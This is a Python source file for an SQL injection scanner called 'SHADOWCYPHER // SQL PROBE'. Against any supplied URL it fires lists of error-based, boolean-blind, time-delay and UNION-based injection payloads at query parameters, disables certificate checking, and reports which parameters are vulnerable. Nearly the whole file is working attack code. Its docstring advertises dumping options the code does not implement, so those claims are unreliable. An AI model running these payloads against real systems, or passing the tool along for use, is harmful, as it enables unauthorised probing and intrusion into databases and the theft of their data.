#!/usr/bin/env python3
"""
SHADOWCYPHER // SQL PROBE — SQL Injection Scanner & Exploiter
Tests URL parameters for SQL injection using error-based, boolean-blind,
time-blind, and UNION-based detection techniques.
Pure Python — no sqlmap dependency required.

Usage:
    python3 sql_probe.py -u "http://target.com/page?id=1" [-p id] [--dump] [--dbs]
"""

import argparse
import sys
import time
import re
import urllib.parse
import urllib.request
import urllib.error
import ssl

C = {"R":"\033[1;31m","G":"\033[1;32m","Y":"\033[1;33m","C":"\033[1;36m",
     "M":"\033[1;35m","N":"\033[0m","B":"\033[1m"}

# SSL context that doesn't verify (for testing)
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"

# Error signatures indicating SQL injection
SQL_ERRORS = {
    "mysql": [r"SQL syntax.*MySQL", r"Warning.*mysql_", r"MySQLSyntaxErrorException",
              r"valid MySQL result", r"check the manual that corresponds to your MySQL"],
    "postgresql": [r"PostgreSQL.*ERROR", r"Warning.*pg_", r"valid PostgreSQL result",
                   r"Npgsql\.", r"PG::SyntaxError"],
    "mssql": [r"Driver.*SQL[\-\_\ ]*Server", r"OLE DB.*SQL Server",
              r"(\bSQL Server[^&lt;&quot;]+Driver)", r"Warning.*mssql_",
              r"Microsoft SQL Native Client error"],
    "oracle": [r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver",
               r"Warning.*oci_", r"Warning.*ora_"],
    "sqlite": [r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite",
               r"Warning.*sqlite_", r"SQLITE_ERROR"],
}

# Error-based payloads
ERROR_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--",
    "\" OR 1=1--", "' OR 1=1#", "1' ORDER BY 100--",
    "1 UNION SELECT NULL--", "') OR ('1'='1",
    "1; WAITFOR DELAY '0:0:0'--", "1' AND 1=1--", "1' AND 1=2--",
]

# Time-based payloads (detect via response delay)
TIME_PAYLOADS = {
    "mysql": "1' AND SLEEP(3)-- ",
    "postgresql": "1'; SELECT pg_sleep(3)--",
    "mssql": "1'; WAITFOR DELAY '0:0:3'--",
    "sqlite": "1' AND 1=randomblob(300000000)--",
    "generic": "1' OR SLEEP(3)#",
}

# Boolean-based payloads
BOOL_PAYLOADS = [
    ("1' AND 1=1-- ", "1' AND 1=2-- "),
    ("1\" AND 1=1-- ", "1\" AND 1=2-- "),
    ("1 AND 1=1", "1 AND 1=2"),
]

def fetch(url, timeout=10):
    """Fetch URL and return (status, body, elapsed)."""
    try:
        req = urllib.request.Request(url, headers={"User-Agent": UA})
        t0 = time.time()
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            return resp.getcode(), body, time.time() - t0
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace") if e.fp else ""
        return e.code, body, 0
    except Exception as e:
        return 0, str(e), 0

def detect_dbms(body):
    """Check response body for SQL error signatures."""
    for dbms, patterns in SQL_ERRORS.items():
        for pattern in patterns:
            if re.search(pattern, body, re.IGNORECASE):
                return dbms
    return None

def inject_param(url, param, payload):
    """Inject payload into a specific URL parameter."""
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    params[param] = payload
    new_query = urllib.parse.urlencode(params)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))

def test_error_based(url, param):
    """Test for error-based SQL injection."""
    print(f"\n  {C['C']}[Phase 1]{C['N']} Error-Based Detection on param '{param}'")
    findings = []

    for payload in ERROR_PAYLOADS:
        test_url = inject_param(url, param, payload)
        status, body, elapsed = fetch(test_url)
        dbms = detect_dbms(body)

        if dbms:
            print(f"  {C['G']}[VULNERABLE]{C['N']} Error-based SQLi detected!")
            print(f"    Payload: {C['Y']}{payload}{C['N']}")
            print(f"    DBMS:    {C['M']}{dbms.upper()}{C['N']}")
            findings.append({"type": "error", "payload": payload, "dbms": dbms})
            return findings  # Found it, no need to continue

    print(f"  {C['Y']}[-]{C['N']} No error-based SQLi detected")
    return findings

def test_boolean_blind(url, param):
    """Test for boolean-based blind SQL injection."""
    print(f"\n  {C['C']}[Phase 2]{C['N']} Boolean-Blind Detection on param '{param}'")
    findings = []

    # Get baseline response
    _, baseline_body, _ = fetch(url)
    baseline_len = len(baseline_body)

    for true_payload, false_payload in BOOL_PAYLOADS:
        true_url = inject_param(url, param, true_payload)
        false_url = inject_param(url, param, false_payload)

        _, true_body, _ = fetch(true_url)
        _, false_body, _ = fetch(false_url)

        true_len = len(true_body)
        false_len = len(false_body)

        # If true condition produces different output than false condition
        # AND true condition is similar to baseline
        diff_ratio = abs(true_len - false_len) / max(true_len, false_len, 1)
        baseline_sim = 1 - abs(true_len - baseline_len) / max(true_len, baseline_len, 1)

        if diff_ratio > 0.05 and baseline_sim > 0.8:
            print(f"  {C['G']}[VULNERABLE]{C['N']} Boolean-blind SQLi detected!")
            print(f"    True payload:  {C['Y']}{true_payload}{C['N']} (len={true_len})")
            print(f"    False payload: {C['Y']}{false_payload}{C['N']} (len={false_len})")
            print(f"    Diff ratio:    {diff_ratio:.2%}")
            findings.append({"type": "boolean", "true": true_payload, "false": false_payload})
            return findings

    print(f"  {C['Y']}[-]{C['N']} No boolean-blind SQLi detected")
    return findings

def test_time_blind(url, param, threshold=2.5):
    """Test for time-based blind SQL injection."""
    print(f"\n  {C['C']}[Phase 3]{C['N']} Time-Blind Detection on param '{param}'")
    findings = []

    # Baseline timing
    _, _, baseline_time = fetch(url)

    for dbms, payload in TIME_PAYLOADS.items():
        test_url = inject_param(url, param, payload)
        _, _, elapsed = fetch(test_url, timeout=15)

        delay = elapsed - baseline_time
        if delay >= threshold:
            print(f"  {C['G']}[VULNERABLE]{C['N']} Time-blind SQLi detected!")
            print(f"    Payload:  {C['Y']}{payload}{C['N']}")
            print(f"    DBMS:     {C['M']}{dbms.upper()}{C['N']}")
            print(f"    Delay:    {delay:.2f}s (baseline: {baseline_time:.2f}s)")
            findings.append({"type": "time", "payload": payload, "dbms": dbms, "delay": delay})
            return findings

    print(f"  {C['Y']}[-]{C['N']} No time-blind SQLi detected")
    return findings

def test_union(url, param):
    """Test for UNION-based SQL injection by enumerating column count."""
    print(f"\n  {C['C']}[Phase 4]{C['N']} UNION-Based Detection on param '{param}'")

    for cols in range(1, 21):
        nulls = ",".join(["NULL"] * cols)
        payload = f"' UNION SELECT {nulls}-- "
        test_url = inject_param(url, param, payload)
        status, body, _ = fetch(test_url)

        # Check if UNION succeeded (no column count mismatch error)
        if status == 200 and "column" not in body.lower():
            dbms = detect_dbms(body)
            if dbms or ("UNION" not in body and len(body) > 100):
                print(f"  {C['G']}[VULNERABLE]{C['N']} UNION-based SQLi detected!")
                print(f"    Columns:  {C['Y']}{cols}{C['N']}")
                print(f"    Payload:  {C['Y']}{payload.strip()}{C['N']}")
                return [{"type": "union", "columns": cols, "payload": payload}]

    print(f"  {C['Y']}[-]{C['N']} No UNION-based SQLi detected")
    return []

def main():
    p = argparse.ArgumentParser(description="ShadowCypher SQL Probe — SQLi Scanner")
    p.add_argument("-u", "--url", required=True, help="Target URL with parameters")
    p.add_argument("-p", "--param", help="Specific parameter to test (default: all)")
    p.add_argument("--all-params", action="store_true", help="Test all parameters")
    p.add_argument("-o", "--output", help="Save results to file")
    a = p.parse_args()

    parsed = urllib.parse.urlparse(a.url)
    params = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))

    if not params:
        print(f"  {C['R']}[-]{C['N']} No URL parameters found. Provide URL like: http://target.com/page?id=1")
        sys.exit(1)

    test_params = [a.param] if a.param else list(params.keys())

    print(f"\n{C['B']}{'='*70}{C['N']}")
    print(f" {C['C']}SHADOWCYPHER // SQL PROBE{C['N']}")
    print(f"{C['B']}{'='*70}{C['N']}")
    print(f"  Target:     {C['Y']}{a.url}{C['N']}")
    print(f"  Parameters: {C['Y']}{', '.join(test_params)}{C['N']}")
    print(f"{C['B']}{'='*70}{C['N']}")

    all_findings = {}

    for param in test_params:
        print(f"\n  {C['B']}═══ Testing parameter: {param} ═══{C['N']}")
        findings = []
        findings.extend(test_error_based(a.url, param))
        if not findings:
            findings.extend(test_boolean_blind(a.url, param))
        if not findings:
            findings.extend(test_time_blind(a.url, param))
        findings.extend(test_union(a.url, param))

        if findings:
            all_findings[param] = findings

    # Summary
    print(f"\n{C['B']}{'='*70}{C['N']}")
    if all_findings:
        print(f"  {C['G']}VULNERABLE PARAMETERS FOUND: {len(all_findings)}{C['N']}")
        for param, findings in all_findings.items():
            for f in findings:
                print(f"    {C['G']}●{C['N']} {param}: {f['type']}-based"
                      f"{' [' + f.get('dbms','').upper() + ']' if f.get('dbms') else ''}")
    else:
        print(f"  {C['Y']}No SQL injection vulnerabilities detected.{C['N']}")
    print(f"{C['B']}{'='*70}{C['N']}\n")

    if a.output and all_findings:
        import json
        with open(a.output, "w") as f:
            json.dump(all_findings, f, indent=2)
        print(f"  Saved to: {a.output}\n")

if __name__ == "__main__":
    main()
